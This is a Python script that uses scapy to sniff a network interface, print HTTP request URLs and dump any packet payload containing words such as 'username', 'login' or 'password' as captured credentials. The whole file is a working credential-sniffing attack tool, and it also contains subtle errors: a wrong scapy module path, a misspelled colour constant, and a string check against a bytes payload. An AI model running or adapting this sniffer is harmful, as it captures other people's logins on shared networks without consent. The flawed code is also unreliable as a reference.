#!/usr/bin/env python
# -*- coding: utf-8 -*-
import scapy.all as scapy
import optparse
from scapy.layer import http
from colorama import Fore

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface name.")
    #parser.add_option("-g", "--gateway", dest="source", help="Gateway IP.")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please Specify an Interface, use --help for more info.")
    #elif not options.source:
     #   parser.error("[-] Please Specify a Source IP, use --help for more info.")
    return options

def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 

def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
          load = packet[scapy.Raw].load
          keywords=["username", "user", "login", "password", "pass", "passwords"]
          for keyword in keywords:
               if keyword in load:
                    return load
                         
def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
          url = get_url(packet)
          print("[+] HTTP Request >> " + url)
          
          login_info = get_login_info(packet)
          if login_info:
               print(Fore.Green+ "\n\n[!] Possible Username/Password >> " + login_info +"\n\n")

options = get_arguments()

sniff(options.interface)
